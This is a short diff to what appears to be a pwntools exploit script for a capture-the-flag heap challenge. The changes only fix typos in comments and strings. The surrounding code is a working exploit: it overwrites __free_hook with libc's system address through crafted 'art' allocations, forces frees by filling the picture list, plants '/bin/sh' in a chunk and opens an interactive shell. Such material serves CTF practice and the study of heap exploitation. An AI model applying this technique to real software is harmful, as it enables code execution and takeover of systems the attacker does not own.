@@ -87,12 +87,12 @@ new_art(c, b'something', 0x20, b'other things')     # picture 2, emptying fastbi
 # Cannot overwrite __malloc_hook because gadgets don't work in this case => __free_hook
 
 system = LIBC.sym['system']
-new_art(c, p64(system), 0x20, b'hellothere')        # picture 3, overwriting __malloc_hook with system address
+new_art(c, p64(system), 0x20, b'hellothere')        # picture 3, overwriting __free_hook with system address
 
 # We cannot delete one picture because it would imply printing the names of the previous ones, which gives segmentation fault, so we have to allocate new pictures until it reaches the maximum number (10) and so frees the chunks allocated for the first picture out of the limit
 
 for i in range(4, 10):
-    new_art(c, b'hustling you', 0x40, b'Most beautifullest art ever made bu human kind')
+    new_art(c, b'hustling you', 0x40, b'Most beautifullest art ever made by human kind')
 
 new_art(c, b'/bin/sh\x00', 0x20, b'kamehamehaaaaa')
 c.interactive()
